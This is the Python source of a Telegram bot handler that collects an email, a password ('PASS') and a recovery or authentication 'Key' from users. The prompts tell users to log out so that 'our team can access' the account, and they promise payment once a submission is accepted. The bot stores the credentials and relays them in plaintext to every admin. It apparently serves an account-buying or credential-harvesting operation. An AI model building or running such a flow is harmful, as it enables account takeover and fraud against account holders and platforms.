import re
import logging
from typing import Optional, Tuple
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, ConversationHandler
from config import ADMIN_IDS
import database as db
from keyboards import cancel_keyboard, main_menu_keyboard, admin_submission_actions_keyboard

logger = logging.getLogger(__name__)

WAIT_EMAIL, WAIT_PASS, WAIT_KEY, WAIT_CONFIRM = range(4)
WAIT_SUPPORT_MSG = 101
WAIT_APPEAL_TEXT = 201

EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")

def key_help_keyboard(support_handle: str = "@Admin", video_url: str = "") -> InlineKeyboardMarkup:
    handle_clean = support_handle.lstrip("@")
    tg_url = f"https://t.me/{handle_clean}"
    vid_url = video_url if video_url else tg_url
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🆘 Need Help with Key? Contact {support_handle}", url=tg_url)],
        [InlineKeyboardButton("🎥 Video Tutorial", url=vid_url)]
    ])

def review_confirm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ I Have Logged Out — Confirm & Submit", callback_data="sub_confirm")],
        [
            InlineKeyboardButton("🔄 Start Over / Edit", callback_data="sub_restart"),
            InlineKeyboardButton("❌ Cancel", callback_data="sub_cancel")
        ]
    ])

async def start_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()

    # Step 1: Prompt for Email (Multiple submissions per user are fully allowed!)
    intro_text = (
        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n\n"
        "Please enter your email address:\n"
        "<i>(Note: Multiple submissions allowed. Resubmitting the same email requires an 8-hour cooldown.)</i>\n\n"
        "<i>Or press ❌ Cancel anytime to stop.</i>"
    )
    if update.message:
        await update.message.reply_text(
            intro_text,
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
    elif update.callback_query:
        await update.callback_query.answer()
        await update.effective_message.reply_text(
            intro_text,
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
    return WAIT_EMAIL

async def check_menu_intercept(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    clean = text.strip()
    user_id = update.effective_user.id if update.effective_user else 0
    is_admin = user_id in ADMIN_IDS

    if clean in ["📝 Submit Information", "/submit"]:
        context.user_data.clear()
        await start_submission(update, context)
        return WAIT_EMAIL
    elif clean in ["📊 Check Status & Queue", "/status"]:
        context.user_data.clear()
        from handlers.user import check_status_handler
        await check_status_handler(update, context)
        return ConversationHandler.END
    elif clean in ["⚖️ Submit Appeal", "/appeal"]:
        context.user_data.clear()
        from handlers.appeal import start_appeal
        await start_appeal(update, context)
        return ConversationHandler.END
    elif clean in ["💬 Support", "/support"]:
        context.user_data.clear()
        from handlers.user import support_handler
        await support_handler(update, context)
        return WAIT_SUPPORT_MSG
    elif clean in ["⚙️ Admin Dashboard", "/admin"]:
        if is_admin:
            context.user_data.clear()
            from handlers.admin import admin_dashboard_command
            await admin_dashboard_command(update, context)
        return ConversationHandler.END
    elif clean in ["❌ Cancel", "/cancel"]:
        context.user_data.clear()
        if update.message:
            await update.message.reply_text("Action cancelled.", reply_markup=main_menu_keyboard(is_admin))
        elif update.callback_query:
            await update.callback_query.answer()
            await update.effective_message.reply_text("Action cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END
    elif clean == "/start":
        context.user_data.clear()
        from handlers.user import start_handler
        await start_handler(update, context)
        return ConversationHandler.END
    return None

def extract_review_details(message_text: str):
    email_m = re.search(r"Email:\s*([^\n<]+)", message_text)
    pass_m = re.search(r"PASS:\s*([^\n<]+)", message_text)
    key_m = re.search(r"Key:\s*([^\n<]+)", message_text)
    email = email_m.group(1).strip() if email_m else None
    pass_code = pass_m.group(1).strip() if pass_m else None
    key_code = key_m.group(1).strip() if key_m else None
    return email, pass_code, key_code

async def receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    is_admin = update.effective_user.id in ADMIN_IDS

    intercept_state = await check_menu_intercept(update, context, email)
    if intercept_state is not None:
        return intercept_state

    if not EMAIL_REGEX.match(email):
        await update.message.reply_text(
            "⚠️ <b>Invalid Email Format!</b>\n"
            "Please enter a valid email address (e.g. <code>user@example.com</code>):\n\n"
            "<i>(Or send ❌ Cancel to return to main menu)</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
        return WAIT_EMAIL

    clean_email = email.lower()

    # Check for existing submission of this email
    existing = await db.get_submission_by_email(clean_email)
    if existing and not is_admin:
        can_resub, reason, rem_h, rem_m = db.check_resubmit_eligibility(existing)
        if reason == "ACCEPTED":
            await update.message.reply_text(
                f"🚫 <b>Email Already Accepted</b>\n\n"
                f"The email <code>{clean_email}</code> has already been accepted and processed.\n\n"
                f"Please enter a <b>different email address</b> (or send ❌ Cancel):",
                parse_mode=ParseMode.HTML,
                reply_markup=cancel_keyboard()
            )
            return WAIT_EMAIL

        if reason == "NOT_UNLOCKED":
            st = existing.get("status", "PENDING")
            await update.message.reply_text(
                f"⚠️ <b>Email Already in Records</b>\n\n"
                f"The email <code>{clean_email}</code> is already in our system (Status: <b>{st}</b>).\n\n"
                f"• If you want to submit another account, please enter a different email below.\n"
                f"• If this submission was disapproved, tap <b>⚖️ Submit Appeal</b> in the menu.\n\n"
                f"<i>Please enter another email address (or send ❌ Cancel):</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=cancel_keyboard()
            )
            return WAIT_EMAIL

        if reason == "COOLDOWN_ACTIVE":
            unlocked_time = existing.get("resubmit_unlocked_at") or "recently"
            await update.message.reply_text(
                f"⏱️ <b>8-Hour Cooldown Active for this Email</b>\n\n"
                f"Admin approved resubmission on {unlocked_time}.\n"
                f"⏳ <b>Time Remaining:</b> <b>{rem_h}h {rem_m}m</b>\n\n"
                f"Please enter a <b>different email address</b> to submit another account, or wait for cooldown:",
                parse_mode=ParseMode.HTML,
                reply_markup=cancel_keyboard()
            )
            return WAIT_EMAIL

        # Cooldown passed and admin unlocked!
        context.user_data["resubmitting_id"] = existing["id"]
        context.user_data["sub_email"] = clean_email
        await update.message.reply_text(
            f"🔄 <b>Resubmission Allowed:</b> <code>{clean_email}</code>\n"
            f"<i>(Admin approval confirmed & 8-hour cooldown has elapsed. Please enter your updated details.)</i>\n\n"
            f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
            f"Please enter your updated <b>PASS</b>:",
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
        return WAIT_PASS

    if existing and is_admin:
        context.user_data["resubmitting_id"] = existing["id"]
    else:
        context.user_data["resubmitting_id"] = None

    context.user_data["sub_email"] = clean_email

    # Step 2: Ask for PASS
    await update.message.reply_text(
        f"✅ Email recorded: <code>{clean_email}</code>\n\n"
        f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
        f"Please enter your <b>PASS</b>:\n\n"
        f"<i>(Or send ❌ Cancel to return to main menu)</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=cancel_keyboard()
    )
    return WAIT_PASS

async def receive_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pass_text = update.message.text.strip()
    intercept_state = await check_menu_intercept(update, context, pass_text)
    if intercept_state is not None:
        return intercept_state

    if len(pass_text) < 1 or len(pass_text) > 100:
        await update.message.reply_text(
            "⚠️ PASS cannot be empty or longer than 100 characters. Please re-enter (or send ❌ Cancel):",
            reply_markup=cancel_keyboard()
        )
        return WAIT_PASS

    context.user_data["sub_pass"] = pass_text

    support_h = await db.get_support_handle()
    video_u = await db.get_video_url()
    await update.message.reply_text(
        f"✅ PASS recorded!\n\n"
        f"🔑 <b>Step 3 of 3: Enter Key</b>\n"
        f"Please enter your <b>Key</b>:\n\n"
        f"<i>💡 Need help with finding your Key? Tap the Help button below:</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=key_help_keyboard(support_h, video_u)
    )
    return WAIT_KEY

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_text = update.message.text.strip()
    intercept_state = await check_menu_intercept(update, context, key_text)
    if intercept_state is not None:
        return intercept_state

    if len(key_text) < 1 or len(key_text) > 100:
        support_h = await db.get_support_handle()
        video_u = await db.get_video_url()
        await update.message.reply_text(
            "⚠️ Please enter a valid Key (or send ❌ Cancel):",
            reply_markup=key_help_keyboard(support_h, video_u)
        )
        return WAIT_KEY

    context.user_data["sub_key"] = key_text

    email = context.user_data.get("sub_email")
    pass_code = context.user_data.get("sub_pass")
    key_code = key_text

    review_card = (
        "📋 <b>Please Review Your Details Before Submitting:</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
        f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ <b>CRITICAL: PLEASE LOG OUT OF YOUR ACCOUNT!</b>\n"
        "<i>Please make sure you have completely <b>LOGGED OUT</b> of this account before confirming. If you stay logged in, verification will fail and your submission cannot be approved.</i>\n\n"
        "👉 <i>Please log out now, then tap <b>✅ I Have Logged Out — Confirm & Submit</b> to send your request:</i>"
    )

    await update.message.reply_text(
        review_card,
        parse_mode=ParseMode.HTML,
        reply_markup=review_confirm_keyboard()
    )
    return WAIT_CONFIRM

async def process_submission_commit(
    user,
    email: str,
    pass_code: str,
    key_code: str,
    resub_id: Optional[int],
    bot,
    target_message=None
):
    is_admin = user.id in ADMIN_IDS

    # Save to database (update if resubmission, else create new)
    if resub_id:
        await db.update_submission_resubmit(resub_id, email, pass_code, key_code)
        submission_id = resub_id
    else:
        submission_id = await db.create_submission(
            user_id=user.id,
            username=user.username,
            email=email,
            pass_code=pass_code,
            key_code=key_code
        )
    submission_obj = await db.get_submission_by_id(submission_id)

    # Queue Calculation
    queue_info = await db.get_queue_info(submission_id)
    position = queue_info["position"]
    ahead_count = queue_info["ahead_count"]
    total_pending = queue_info["total_pending"]
    submitted_date = submission_obj["created_at"]
    resub_date = submission_obj.get("resubmitted_at") or submission_obj.get("updated_at")

    logout_notice = (
        "━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ <b>ACTION REQUIRED: PLEASE LOG OUT NOW!</b>\n"
        "<i>Please ensure you are completely logged out of this account immediately so our team can access and verify your request.</i>\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
    )

    if resub_id:
        user_confirm = (
            f"🔄 <b>Resubmission Received Successfully!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id}\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Resubmitted Date:</b> {resub_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"{logout_notice}"
            f"🔢 <b>Queue Information:</b>\n"
            f"• <b>Your Queue Position:</b> #{position}\n"
            f"• <b>Submissions Ahead of You:</b> {ahead_count} waiting for review\n"
            f"• <b>Total Pending Queue:</b> {total_pending}\n\n"
            f"⏳ <b>Current Status:</b> <b>Pending Review</b>\n\n"
            f"📢 <b>Next Steps:</b>\n"
            f"1. When an admin starts reviewing, your status will change to <b>In Review</b>.\n"
            f"2. Once accepted, you will receive payment instructions.\n"
            f"3. You can track your position anytime using the <b>📊 Check Status & Queue</b> button."
        )
    else:
        user_confirm = (
            f"🎉 <b>Submission Received Successfully!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id}\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Submitted Date:</b> {submitted_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"{logout_notice}"
            f"🔢 <b>Queue Information:</b>\n"
            f"• <b>Your Queue Position:</b> #{position}\n"
            f"• <b>Submissions Ahead of You:</b> {ahead_count} waiting for review\n"
            f"• <b>Total Pending Queue:</b> {total_pending}\n\n"
            f"⏳ <b>Current Status:</b> <b>Pending Review</b>\n\n"
            f"📢 <b>Next Steps:</b>\n"
            f"1. When an admin starts reviewing, your status will change to <b>In Review</b>.\n"
            f"2. Once accepted, you will receive payment instructions.\n"
            f"3. You can track your position anytime using the <b>📊 Check Status & Queue</b> button."
        )

    if target_message:
        try:
            await target_message.edit_text(user_confirm, parse_mode=ParseMode.HTML)
        except Exception:
            await bot.send_message(chat_id=user.id, text=user_confirm, parse_mode=ParseMode.HTML)
    else:
        await bot.send_message(chat_id=user.id, text=user_confirm, parse_mode=ParseMode.HTML)

    await bot.send_message(
        chat_id=user.id,
        text="👇 Use the menu below to check your status or submit another:",
        reply_markup=main_menu_keyboard(is_admin)
    )

    # Alert to Admins
    if resub_id:
        admin_alert = (
            f"🔄 <b>Resubmitted Details Received!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id} (RESUBMITTED)\n"
            f"👤 <b>User:</b> @{user.username or 'NoUsername'} (ID: <code>{user.id}</code>)\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Resubmitted Date:</b> {resub_date}\n"
            f"🔢 <b>Queue Position:</b> #{position} (Total Pending: {total_pending})\n"
            f"📊 <b>Status:</b> ⏳ PENDING\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
    else:
        admin_alert = (
            f"🔔 <b>New Submission Received!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id}\n"
            f"👤 <b>User:</b> @{user.username or 'NoUsername'} (ID: <code>{user.id}</code>)\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Date:</b> {submitted_date}\n"
            f"🔢 <b>Queue Position:</b> #{position} (Total Pending: {total_pending})\n"
            f"📊 <b>Status:</b> ⏳ PENDING\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=admin_alert,
                parse_mode=ParseMode.HTML,
                reply_markup=admin_submission_actions_keyboard(submission_id, "PENDING")
            )
        except Exception as e:
            logger.error(f"Failed to notify admin {admin_id}: {e}")

async def sub_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    email = context.user_data.get("sub_email")
    pass_code = context.user_data.get("sub_pass")
    key_code = context.user_data.get("sub_key")
    resub_id = context.user_data.get("resubmitting_id")

    if not email or not pass_code or not key_code:
        if query.message and query.message.text:
            parsed_e, parsed_p, parsed_k = extract_review_details(query.message.text)
            email = email or parsed_e
            pass_code = pass_code or parsed_p
            key_code = key_code or parsed_k

    if not email or not pass_code or not key_code:
        await query.edit_message_text(
            "⚠️ Session details could not be retrieved. Please click 📝 Submit Information to enter details.",
            reply_markup=None
        )
        context.user_data.clear()
        return ConversationHandler.END

    context.user_data.clear()
    await process_submission_commit(user, email, pass_code, key_code, resub_id, context.bot, target_message=query.message)
    return ConversationHandler.END

async def receive_confirm_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw_text = update.message.text.strip()
    intercept_state = await check_menu_intercept(update, context, raw_text)
    if intercept_state is not None:
        return intercept_state

    low = raw_text.lower()
    user = update.effective_user
    is_admin = user.id in ADMIN_IDS

    if any(k in low for k in ["confirm", "yes", "ok", "submit", "done", "logged out"]):
        email = context.user_data.get("sub_email")
        pass_code = context.user_data.get("sub_pass")
        key_code = context.user_data.get("sub_key")
        resub_id = context.user_data.get("resubmitting_id")
        if not email or not pass_code or not key_code:
            await update.message.reply_text(
                "⚠️ Details missing or session expired. Please tap 📝 Submit Information to start over.",
                reply_markup=main_menu_keyboard(is_admin)
            )
            context.user_data.clear()
            return ConversationHandler.END

        context.user_data.clear()
        await process_submission_commit(user, email, pass_code, key_code, resub_id, context.bot)
        return ConversationHandler.END

    elif any(k in low for k in ["cancel", "no", "stop", "abort"]):
        context.user_data.clear()
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    elif any(k in low for k in ["edit", "restart", "start over"]):
        context.user_data.clear()
        await start_submission(update, context)
        return WAIT_EMAIL

    else:
        await update.message.reply_text(
            "👉 Please tap <b>✅ I Have Logged Out — Confirm & Submit</b> or <b>🔄 Start Over / Edit</b> below to finish:",
            parse_mode=ParseMode.HTML,
            reply_markup=review_confirm_keyboard()
        )
        return WAIT_CONFIRM

async def sub_restart_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Starting over...")
    context.user_data.clear()

    await query.edit_message_text(
        "🔄 <b>Starting over.</b>\n\n"
        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n"
        "Please enter your email address:\n"
        "<i>(Note: Resubmitting the same email requires an 8-hour cooldown.)</i>",
        parse_mode=ParseMode.HTML
    )
    return WAIT_EMAIL

async def sub_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Cancelled.")
    context.user_data.clear()
    is_admin = update.effective_user.id in ADMIN_IDS

    await query.edit_message_text("❌ Submission cancelled.")
    await context.bot.send_message(
        chat_id=update.effective_user.id,
        text="Main menu:",
        reply_markup=main_menu_keyboard(is_admin)
    )
    return ConversationHandler.END

async def start_resubmission_from_appeal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    sub_id = int(query.data.split(":")[1])
    sub = await db.get_submission_by_id(sub_id)
    if not sub:
        await query.edit_message_text("⚠️ Submission not found.")
        return ConversationHandler.END

    can_resub, reason, rem_h, rem_m = db.check_resubmit_eligibility(sub)
    if not can_resub:
        await query.answer(f"⏱️ Cooldown active: {rem_h}h {rem_m}m remaining!", show_alert=True)
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["sub_email"] = sub["email"]
    context.user_data["resubmitting_id"] = sub["id"]

    await query.edit_message_text(
        f"🔄 <b>Resubmission Started for:</b> <code>{sub['email']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
        f"Please enter your updated <b>PASS</b>:\n\n"
        f"<i>(Or send ❌ Cancel anytime)</i>",
        parse_mode=ParseMode.HTML
    )
    return WAIT_PASS
